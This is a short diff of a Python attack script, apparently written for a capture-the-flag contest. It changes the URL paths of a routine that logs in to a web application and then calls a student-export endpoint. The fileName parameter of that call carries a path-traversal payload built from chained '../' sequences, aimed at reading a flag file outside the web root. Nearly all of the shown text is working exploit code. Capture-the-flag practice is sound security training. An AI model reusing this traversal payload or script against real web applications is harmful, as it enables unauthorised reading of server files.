@@ -36,10 +36,10 @@ def vulnerable_attack(target,target_port,cmd):
 def shit(target,target_port):
     s = requests.Session()
     ip = target
-    url = 'http://%s:%s/app.php/login' % (ip,str(target_port))
-    url_2 = 'http://%s:%s/app.php/login_check' %(ip,str(target_port))
-    url_3 = 'http://%s:%s/app.php/' %(ip,str(target_port))
-    url_4 = 'http://%s:%s/app.php/classroom/1/manage/student/export?role=student&fileName=/var/www/html/app/data/private_files/../../../../../../../../../../../home/ctf/a/../flag'%(ip,str(target_port))
+    url = 'http://%s:%s/web/login' % (ip,str(target_port))
+    url_2 = 'http://%s:%s/web/login_check' %(ip,str(target_port))
+    url_3 = 'http://%s:%s/web/' %(ip,str(target_port))
+    url_4 = 'http://%s:%s/web/classroom/1/manage/student/export?role=student&fileName=/var/www/html/web/app/data/private_files/../../../../../../../../../../../../a/../flag'%(ip,str(target_port))
     content = s.get(url).content
 
     index_1 = content.find('<meta name="description"')
